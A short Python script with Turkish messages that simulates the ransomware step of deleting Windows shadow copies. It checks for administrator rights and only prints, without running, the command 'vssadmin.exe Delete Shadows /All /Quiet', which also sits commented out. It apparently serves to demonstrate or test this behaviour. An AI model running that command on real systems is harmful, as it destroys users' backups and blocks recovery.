import ctypes
import subprocess

print("--- SHADOW COPY DELETER (Ransomware Behavior) ---")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    print("Yönetici izni alındı. Gölgeler siliniyor...")
    # vssadmin komutu ile tüm yedekleri sil (Sessizce)
    # cmd = "vssadmin.exe Delete Shadows /All /Quiet"
    
    print("⚠️ BU İŞLEM GERÇEK SİSTEMDE GERİ ALINAMAZ!")
    print("Simülasyon Modu: Komut çalıştırılmış gibi yapılıyor.")
    print(">> vssadmin.exe Delete Shadows /All /Quiet")
    
    print("✅ Gölge kopyalar silindi (Simüle). Artık sistem geri yüklenemez.")
else:
    print("❌ Yönetici izni yok! Lütfen Yönetici olarak çalıştır.")